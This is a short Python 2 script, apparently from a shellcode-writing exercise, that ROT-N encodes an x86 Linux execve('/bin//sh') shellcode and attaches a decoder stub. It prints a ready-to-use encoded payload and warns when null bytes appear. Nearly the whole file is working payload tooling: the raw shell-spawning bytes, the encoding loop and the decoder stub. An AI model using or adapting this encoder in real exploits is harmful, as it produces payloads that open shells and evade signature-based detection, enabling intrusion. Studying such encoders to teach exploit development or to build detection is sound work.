#!/bin/python

import sys

def parse_args():
    if len(sys.argv) < 2:
        print "Usage: {0} N, where N is the number of rotations to be made".format(sys.argv[0])
        print "[+] Using default value of N = 13"
        return 13
    else:
        x = int(sys.argv[1]) % 256
        if x < 1:
            print "[-] Invalid number of rotations"
            exit()
        return x

magic = parse_args()
rotated_execve = ""
hasNulls = False
        
print "[+] Generating ROT-{0} encoded payload".format(magic)

execvesh = ("\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\xb0\x0b\xcd\x80")


for i in bytearray(execvesh):
    j = (i + magic)%256
    if j == 0:
        hasNulls = True
    rotated_execve += '\\x'
    rotated_execve += '%02x' %j

sc = "\\xeb\\x09\\x5e\\x80\\x2e" + ("\\x%02x"%magic) + "\\x74\\x08\\x46\\xeb\\xf8\\xe8\\xf2\\xff\\xff\\xff" +rotated_execve + ("\\x%02x"%magic)

print "[+] Generated shellcode: " + sc

if hasNulls:
    print "[-] WARNING: Encoded payload contains at least one null byte, consider changing N"
